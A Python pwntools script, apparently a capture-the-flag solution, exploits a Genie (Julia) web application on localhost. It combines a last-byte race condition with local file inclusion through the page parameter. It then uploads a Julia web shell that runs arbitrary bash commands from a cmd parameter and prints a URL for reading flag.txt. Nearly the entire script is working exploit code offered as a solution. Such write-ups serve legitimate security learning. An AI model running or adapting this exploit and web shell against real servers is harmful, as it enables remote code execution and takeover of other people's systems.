# solution written for original version with a much tighter race condition window

from pwn import *
from multiprocessing import Pool

context.log_level = 'warn'

target_host = "localhost"
target_port = 1337
command = "echo '123'"

include_request_template = """\
GET /?page=$$PAGE$$ HTTP/1.1\r
Host: bruh\r
\r
"""

sync_pages = ["/home/ctf/.julia/packages/Genie/yQwwj/test/fileuploads/test.jl", "app.jl"]

sockets = {}

print("[*] starting last byte sync")
for i in range(len(sync_pages)):
    sockets[i] = remote(target_host, target_port)
    req = include_request_template.replace("$$PAGE$$", sync_pages[i]).encode()
    sockets[i].send(req[:-1])

def send_last_byte(sock):
    sock.send(b'\n')

pool = Pool(len(sync_pages) + 1)

pool.map(send_last_byte, sockets.values())

# wait for first socket to get a response, this is scuffed and should instead wait for all sockets but whatever
sockets[0].recv(1)

print("[+] finished last byte sync")

print("[*] uploading payload")
import requests

payload = "cmd = params(:cmd, \"whoami\"); io = IOBuffer(); cmd = pipeline(`bash -c $cmd`; stdout=io, stderr=devnull); run(cmd); @show String(take!(io))"

requests.post(f"http://{target_host}:{str(target_port)}", files={"fileupload":("rce.jl",payload)}, data={"greeting":"x"})
r = requests.get(f"http://{target_host}:{str(target_port)}", params={"page": "rce.jl", "cmd": command})

if '123' in r.text:
    print(f"[+] rce successful, http://{target_host}:{str(target_port)}/?page=rce.jl&cmd=cat+flag.txt") 
